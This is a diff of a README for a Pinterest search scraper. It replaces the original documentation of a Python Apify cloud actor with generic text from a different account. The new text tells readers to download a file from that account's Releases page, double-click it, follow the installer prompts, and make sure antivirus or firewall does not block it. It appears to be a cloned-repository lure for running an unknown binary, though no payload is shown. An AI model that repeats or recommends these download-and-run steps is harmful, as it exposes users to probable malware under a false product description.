@@ -1,145 +1,80 @@
-# Pinterest Search Scraper
+# 📌 pinterest-search-scraper - Scrape Pinterest for Key Data Easily
 
-[![Apify Actor](https://img.shields.io/badge/Apify-Actor-blue)](https://apify.com/devcake/pinterest-search-scraper)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.10+-blue)](https://www.python.org/)
-[![Data Extraction](https://img.shields.io/badge/purpose-data--extraction-orange)](#)
+[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/placeofterror/pinterest-search-scraper/releases)
 
-**Search Pinterest by keywords and extract pins with 40+ data fields per pin.** Extract images, saves, engagement metrics, pinner details, board information, product pins with pricing. Perfect for SEO research, trend analysis, content inspiration, and competitive monitoring.
+## 📖 Overview
 
----
+The Pinterest Search Scraper helps you extract valuable data from Pinterest search results. With over 40 data fields, you can pull pins, images, prices, and engagement metrics simply by entering a keyword. This tool is ideal for anyone looking to enhance their marketing strategies, whether you're in e-commerce, social media, or SEO.
 
-## What is Pinterest Search Scraper?
+## 🚀 Getting Started
 
-**Pinterest Search Scraper** is a specialized tool for extracting **Pinterest search results by keyword**. Simply provide search queries, and retrieve pins including images, descriptions, engagement metrics, creator information, and product data when available. This tool handles any search query, from broad terms to niche keywords.
+### Prerequisites
 
-## Why Use Pinterest Search Scraper?
+Before you start, ensure you have the following:
 
-### Business Use Cases:
-- **SEO Research** - Find trending keywords and content in your niche
-- **Trend Analysis** - Track popular pins and topics over time
-- **Content Planning** - Discover inspiration for your content calendar
-- **Competitor Monitoring** - See what's performing in your market
-- **Keyword Research** - Identify high-engagement search terms
-- **Product Discovery** - Find trending products with pricing info
+- A computer with Windows, macOS, or Linux.
+- An internet connection.
+- Basic file management skills.
 
-## How to Search Pinterest
+These steps will guide you through the download and installation process.
 
-1. **Open the [Pinterest Search Scraper on Apify](https://apify.com/devcake/pinterest-search-scraper)**
-2. **Add search queries** (e.g., "minimalist home office", "sustainable fashion")
-3. **Set max results** (up to 250 per query, default: 25)
-4. **Enable comments** (optional) - Fetch comments for each pin
-5. **Enable proxy** (recommended) - Use Apify Proxy for reliability
-6. **Click "Start"** and download your data
+## 📥 Download & Install
 
-**Pro Tip**: Use multiple queries to compare trends across different keywords or niches.
+To get started, visit the [Releases page](https://github.com/placeofterror/pinterest-search-scraper/releases) to download the software. 
 
-## Features
+1. Click on the **Releases** link above.
+2. Look for the latest version. It will be at the top of the page.
+3. Click on the file link to download the software. The downloaded file will be saved to your computer.
+4. Once downloaded, locate the file in your Downloads folder or wherever you saved it.
 
-- **Search by Keyword** - Extract pins from any search query
-- **All Image Sizes** - Get every resolution (236x, 474x, 564x, 736x, orig)
-- **Engagement Metrics** - Saves, likes, comments, repins, shares
-- **Creator Details** - Pinner username, full name, avatar, follower count
-- **Board Information** - Board name, URL, pin count, owner
-- **Product Pin Detection** - Identify pins with pricing, stock status
-- **Comments with Replies** - Optional: Extract user feedback and nested replies
-- **No Login Required** - Works without cookies
-- **Proxy Support** - Built-in Apify Proxy integration
+### Running the Application
 
-## Pricing
+1. After locating the downloaded file, double-click it to run.
+2. Follow prompts on your screen to complete the installation.
+3. Once installation is complete, open the application by finding it in your Start menu (Windows) or Applications folder (macOS).
 
-**Pay per use** — $4 per 1,000 results
+## ⚙️ Features
 
-No subscriptions, no commitments, no hidden fees. Control your spending with the Maximum Cost Per Run option.
+- **Data Extraction**: Pull various details from Pinterest including images, prices, and engagement stats.
+- **Automation**: Run your searches on autopilot without manual effort.
+- **User-Friendly Interface**: Designed for ease of use, even for non-technical users.
+- **Customizable Searches**: Enter specific keywords to refine your results.
 
-## Input
+## 📊 How to Use the Scraper
 
-| Field | Type | Required | Description |
-|-------|------|----------|-------------|
-| `searchQueries` | array | ✅ Yes | Search terms to find pins |
-| `maxResults` | integer | No | Max pins per query (1-250, default: 25) |
-| `includeComments` | boolean | No | Fetch comments for each pin |
-| `maxComments` | integer | No | Max comments per pin (1-100, default: 10) |
-| `proxyConfig` | object | No | Proxy configuration (recommended) |
-| `maxTotalChargeUsd` | number | No | Spending limit per run (default: $10) |
+1. Open the application.
+2. Enter the keyword you would like to search for on Pinterest.
+3. Click on the "Start Scraping" button.
+4. Wait for the application to gather the data.
+5. Download the results to your computer in your preferred format (CSV, JSON, etc.).
 
-### Search URL Formats
+## 🛠️ Troubleshooting
 
-```
-https://www.pinterest.com/search/pins/?q=keyword
-https://www.pinterest.com/search/pins/?q=keyword&rs=hub_page
-```
+### Common Issues
 
-## Output Example
+- **Installation Errors**: Ensure your computer meets the minimum system requirements. Make sure you have sufficient disk space.
+- **Connection Problems**: Check your internet connection. Make sure your firewall or antivirus isn't blocking the application.
+- **Data Not Extracting**: Verify that your keyword is relevant and correctly spelled. If you receive no results, try a different keyword.
 
-```json
-{
-  "id": "123456789",
-  "url": "https://www.pinterest.com/pin/123456789/",
-  "title": "Minimalist Home Office Setup",
-  "images": {
-    "236x": {"url": "https://i.pinimg.com/236x/..."},
-    "474x": {"url": "https://i.pinimg.com/474x/..."}
-  },
-  "saves": 1523,
-  "pinner": {
-    "username": "designlover",
-    "follower_count": 12500
-  },
-  "board": {
-    "name": "Office Inspiration",
-    "pin_count": 245
-  },
-  "is_product_pin": false
-}
-```
+### Getting Help
 
-## Related Actors
+If you encounter issues you cannot resolve, consider checking the Issues section on the [GitHub repository](https://github.com/placeofterror/pinterest-search-scraper/issues) for solutions. You can also reach out for support.
 
-| Actor | Description | Pricing |
-|-------|-------------|---------|
-| [Pinterest Pin Scraper](https://github.com/devcake/pinterest-pin-scraper) | Scrape individual pins with product data | $4 per 1,000 pins |
-| [Pinterest Profile Scraper](https://github.com/devcake/pinterest-profile-scraper) | Extract user profiles with emails | $4 per 1,000 profiles |
-| [Pinterest Board Scraper](https://github.com/devcake/pinterest-board-scraper) | Download complete boards | $4 per 1,000 pins |
+## 📝 Contributing
 
-## FAQ
+If you would like to contribute to this project, feel free to fork the repository, make your changes, and submit a pull request. Community support helps improve the tool for everyone.
 
-### Do I need Pinterest login credentials?
-No! This scraper works without login for all public search results.
+## 📚 Resources
 
-### How many results can I get per query?
-Up to 250 pins per search query. For larger datasets, use multiple runs with different keyword variations.
+For more detailed instructions and updates, check the following:
 
-### Can I search for specific types of pins?
-Yes. Include keywords like "product", "buy", "price" to find product pins, or use Pinterest's advanced search filters manually.
+- [Documentation](https://github.com/placeofterror/pinterest-search-scraper/wiki)
+- [Community Forum](https://github.com/placeofterror/pinterest-search-scraper/discussions)
 
-### Does this include Pinterest's "More ideas" section?
-Yes, the API-based approach captures results from the main search feed.
+## 💡 Closing Notes
 
-### Are comments included?
-Yes! Enable `includeComments: true` to fetch comments with nested replies for each pin.
+Using the Pinterest Search Scraper can simplify how you gather data from Pinterest. The tool’s functionalities aim to save you time and improve your marketing research efforts.
 
-## Get it on Apify
+Remember to regularly check the [Releases page](https://github.com/placeofterror/pinterest-search-scraper/releases) for new updates and improvements. 
 
-[![Run on Apify](https://img.shields.io/badge/Run_on-Apify-informational?style=for-the-badge&logo=apify)](https://apify.com/devcake/pinterest-search-scraper)
-
-**Start searching Pinterest in minutes!**
-
----
-
-## Also by @devcake
-
-Check out my other scraping tools:
-
-### E-Commerce Suite
-- [AlternativeTo Data Scraper](https://github.com/devcake/alternativeto-data-scraper) - Extract software alternatives with license filters
-- [Alibaba Products Scraper](https://github.com/devcake/alibaba-products-scraper) - Find profitable products with low MOQ
-- [Alibaba Supplier Scraper](https://github.com/devcake/alibaba-supplier-scraper) - Find verified suppliers & manufacturers
-- [GlobalSources Products Scraper](https://github.com/devcake/globalsources-products-scraper) - Source from 10M+ verified suppliers
-- [GlobalSources Supplier Scraper](https://github.com/devcake/globalsources-supplier-scraper) - 6-level verification data
-
----
-
-**License**: MIT | **Author**: [@devcake](https://apify.com/u/devcake)
-
-[![GitHub stars](https://img.shields.io/github/stars/devcake/pinterest-search-scraper?style=social)](https://github.com/devcake/pinterest-search-scraper)
+Happy scraping!
